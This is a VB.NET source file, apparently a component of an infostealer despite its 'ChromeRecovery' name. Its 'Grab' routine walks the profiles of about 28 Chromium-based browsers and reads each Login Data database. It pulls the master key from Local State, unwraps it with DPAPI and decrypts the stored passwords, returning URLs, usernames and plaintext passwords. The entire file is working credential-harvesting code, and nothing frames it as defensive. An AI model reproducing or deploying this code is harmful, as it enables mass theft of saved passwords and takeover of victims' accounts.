Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Namespace ChromeRecovery
    Public Class Chromium
        Public Shared LocalApplicationData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        Public Shared ApplicationData As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)

        Public Shared Function Grab() As List(Of Account)
            Dim ChromiumPaths As Dictionary(Of String, String) = New Dictionary(Of String, String)() From {
                {"Chrome", LocalApplicationData & "\Google\Chrome\User Data"},
                {"Opera", Path.Combine(ApplicationData, "Opera Software\Opera Stable")},
                {"Yandex", Path.Combine(LocalApplicationData, "Yandex\YandexBrowser\User Data")},
                {"360 Browser", LocalApplicationData & "\360Chrome\Chrome\User Data"},
                {"Comodo Dragon", Path.Combine(LocalApplicationData, "Comodo\Dragon\User Data")},
                {"CoolNovo", Path.Combine(LocalApplicationData, "MapleStudio\ChromePlus\User Data")},
                {"SRWare Iron", Path.Combine(LocalApplicationData, "Chromium\User Data")},
                {"Torch Browser", Path.Combine(LocalApplicationData, "Torch\User Data")},
                {"Brave Browser", Path.Combine(LocalApplicationData, "BraveSoftware\Brave-Browser\User Data")},
                {"Iridium Browser", LocalApplicationData & "\Iridium\User Data"},
                {"7Star", Path.Combine(LocalApplicationData, "7Star\7Star\User Data")},
                {"Amigo", Path.Combine(LocalApplicationData, "Amigo\User Data")},
                {"CentBrowser", Path.Combine(LocalApplicationData, "CentBrowser\User Data")},
                {"Chedot", Path.Combine(LocalApplicationData, "Chedot\User Data")},
                {"CocCoc", Path.Combine(LocalApplicationData, "CocCoc\Browser\User Data")},
                {"Elements Browser", Path.Combine(LocalApplicationData, "Elements Browser\User Data")},
                {"Epic Privacy Browser", Path.Combine(LocalApplicationData, "Epic Privacy Browser\User Data")},
                {"Kometa", Path.Combine(LocalApplicationData, "Kometa\User Data")},
                {"Orbitum", Path.Combine(LocalApplicationData, "Orbitum\User Data")},
                {"Sputnik", Path.Combine(LocalApplicationData, "Sputnik\Sputnik\User Data")},
                {"uCozMedia", Path.Combine(LocalApplicationData, "uCozMedia\Uran\User Data")},
                {"Vivaldi", Path.Combine(LocalApplicationData, "Vivaldi\User Data")},
                {"Sleipnir 6", Path.Combine(ApplicationData, "Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")},
                {"Citrio", Path.Combine(LocalApplicationData, "CatalinaGroup\Citrio\User Data")},
                {"Coowon", Path.Combine(LocalApplicationData, "Coowon\Coowon\User Data")},
                {"Liebao Browser", Path.Combine(LocalApplicationData, "liebao\User Data")},
                {"QIP Surf", Path.Combine(LocalApplicationData, "QIP Surf\User Data")},
                {"Edge Chromium", Path.Combine(LocalApplicationData, "Microsoft\Edge\User Data")}
            }
            Dim list = New List(Of Account)()

            For Each item In ChromiumPaths
                list.AddRange(Accounts(item.Value, item.Key))
            Next

            Return list
        End Function

        Private Shared Function Accounts(ByVal path As String, ByVal browser As String, ByVal Optional table As String = "logins") As List(Of Account)
            Dim loginDataFiles As List(Of String) = GetAllProfiles(path)
            Dim data As List(Of Account) = New List(Of Account)()

            For Each loginFile As String In loginDataFiles.ToArray()
                If Not File.Exists(loginFile) Then Continue For
                Dim SQLDatabase As SQLiteHandler

                Try
                    SQLDatabase = New SQLiteHandler(loginFile)
                Catch ex As System.Exception
                    Console.WriteLine(ex.ToString())
                    Continue For
                End Try

                If Not SQLDatabase.ReadTable(table) Then Continue For

                For I As Integer = 0 To SQLDatabase.GetRowCount() - 1

                    Try
                        Dim host As String = SQLDatabase.GetValue(I, "origin_url")
                        Dim username As String = SQLDatabase.GetValue(I, "username_value")
                        Dim password As String = SQLDatabase.GetValue(I, "password_value")

                        If password IsNot Nothing Then

                            If password.StartsWith("v10") OrElse password.StartsWith("v11") Then
                                Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(loginFile).Parent.FullName)
                                If masterKey Is Nothing Then Continue For
                                password = DecryptWithKey(Encoding.[Default].GetBytes(password), masterKey)
                            Else
                                password = Decrypt(password)
                            End If
                        Else
                            Continue For
                        End If

                        If Not String.IsNullOrEmpty(host) AndAlso Not String.IsNullOrEmpty(username) AndAlso Not String.IsNullOrEmpty(password) Then data.Add(New Account() With {
                            .URL = host,
                            .UserName = username,
                            .Password = password,
                            .Application = browser
                        })
                    Catch ex As Exception
                        Console.WriteLine(ex.ToString())
                    End Try
                Next
            Next

            Return data
        End Function

        Private Shared Function GetAllProfiles(ByVal DirectoryPath As String) As List(Of String)
            Dim loginDataFiles As List(Of String) = New List(Of String) From {
                DirectoryPath & "\Default\Login Data",
                DirectoryPath & "\Login Data"
            }

            If Directory.Exists(DirectoryPath) Then

                For Each dir As String In Directory.GetDirectories(DirectoryPath)
                    If dir.Contains("Profile") Then loginDataFiles.Add(dir & "\Login Data")
                Next
            End If

            Return loginDataFiles
        End Function

        Public Shared Function DecryptWithKey(ByVal encryptedData As Byte(), ByVal MasterKey As Byte()) As String
            Dim iv As Byte() = New Byte() {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
            Array.Copy(encryptedData, 3, iv, 0, 12)

            Try
                Dim Buffer As Byte() = New Byte(encryptedData.Length - 15 - 1) {}
                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15)
                Dim tag As Byte() = New Byte(15) {}
                Dim data As Byte() = New Byte(Buffer.Length - tag.Length - 1) {}
                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16)
                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length)
                Dim aesDecryptor As AesGcm = New AesGcm()
                Dim result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, Nothing, data, tag))
                Return result
            Catch ex As Exception
                Console.WriteLine(ex.ToString())
                Return Nothing
            End Try
        End Function

        Public Shared Function GetMasterKey(ByVal LocalStateFolder As String) As Byte()
            Dim filePath As String = LocalStateFolder & "\Local State"
            Dim masterKey As Byte() = New Byte() {}
            If File.Exists(filePath) = False Then Return Nothing
            Dim pattern = New System.Text.RegularExpressions.Regex("""encrypted_key"":""(.*?)""", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath))

            For Each prof As System.Text.RegularExpressions.Match In pattern
                If prof.Success Then masterKey = Convert.FromBase64String((prof.Groups(1).Value))
            Next

            Dim temp As Byte() = New Byte(masterKey.Length - 5 - 1) {}
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5)

            Try
                Return ProtectedData.Unprotect(temp, Nothing, DataProtectionScope.CurrentUser)
            Catch ex As Exception
                Console.WriteLine(ex.ToString())
                Return Nothing
            End Try
        End Function

        Public Shared Function Decrypt(ByVal encryptedData As String) As String
            If encryptedData Is Nothing OrElse encryptedData.Length = 0 Then Return Nothing

            Try
                Return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.[Default].GetBytes(encryptedData), Nothing, DataProtectionScope.CurrentUser))
            Catch ex As Exception
                Console.WriteLine(ex.ToString())
                Return Nothing
            End Try
        End Function
    End Class
End Namespace

